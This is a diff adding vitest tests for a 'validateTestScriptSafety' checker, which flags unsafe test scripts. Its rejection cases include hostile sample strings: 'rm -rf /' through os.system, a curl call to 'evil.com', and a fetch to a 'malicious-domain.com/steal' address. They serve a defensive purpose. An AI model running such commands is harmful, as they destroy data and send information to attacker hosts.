@@ -2,7 +2,7 @@ import { describe, it, expect, beforeEach, afterEach } from "vitest";
 import fs from "fs";
 import path from "path";
 import os from "os";
-import { loadDotenv } from "../index";
+import { loadDotenv, validateTestScriptSafety } from "../index";
 
 describe("loadDotenv parser", () => {
   let tmpDir: string;
@@ -36,5 +36,21 @@ describe("loadDotenv parser", () => {
     expect(() => {
       loadDotenv("/path/to/nonexistent/.env");
     }).not.toThrow();
+  });
+});
+
+describe("validateTestScriptSafety security inspector", () => {
+  it("should pass safe test assertions", () => {
+    const safeJs = "const assert = require('assert'); assert.strictEqual(1 + 1, 2);";
+    const safePy = "import unittest\nclass TestApp(unittest.TestCase):\n  def test_math(self):\n    self.assertEqual(1+1, 2)";
+    expect(validateTestScriptSafety(safeJs).safe).toBe(true);
+    expect(validateTestScriptSafety(safePy).safe).toBe(true);
+  });
+
+  it("should reject dangerous subprocess or external network calls", () => {
+    expect(validateTestScriptSafety("require('child_process').exec('ls')").safe).toBe(false);
+    expect(validateTestScriptSafety("import os\nos.system('rm -rf /')").safe).toBe(false);
+    expect(validateTestScriptSafety("import subprocess\nsubprocess.Popen(['curl', 'http://evil.com'])").safe).toBe(false);
+    expect(validateTestScriptSafety("fetch('https://malicious-domain.com/steal')").safe).toBe(false);
   });
 });
